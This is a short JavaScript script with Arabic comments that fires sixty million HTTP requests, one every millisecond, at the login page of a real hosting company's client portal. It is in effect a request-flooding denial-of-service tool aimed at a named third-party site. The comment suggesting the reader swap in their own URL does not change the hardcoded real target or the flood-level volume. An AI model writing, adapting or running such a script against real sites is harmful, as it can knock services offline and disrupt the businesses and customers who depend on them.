const sendRequests = async (url, times, interval) => {
  for (let i = 0; i < times; i++) {
    fetch(url)
      .then((response) => {
        console.log(`Request ${i + 1}:`, response.status);
      })
      .catch((error) => {
        console.error(`Request ${i + 1} failed:`, error);
      });

    // الانتظار بين الطلبات
    await new Promise((resolve) => setTimeout(resolve, interval));
  }
};

// استدعاء الدالة
const targetUrl = 'https://my.libyanspider.com/index.php?rp=%2Flogin&language=english'; // استبدلها برابط موقعك
const totalRequests = 60000000; // عدد الطلبات
const requestInterval = 1; // الفاصل الزمني بين الطلبات (بالملي ثانية)

sendRequests(targetUrl, totalRequests, requestInterval);
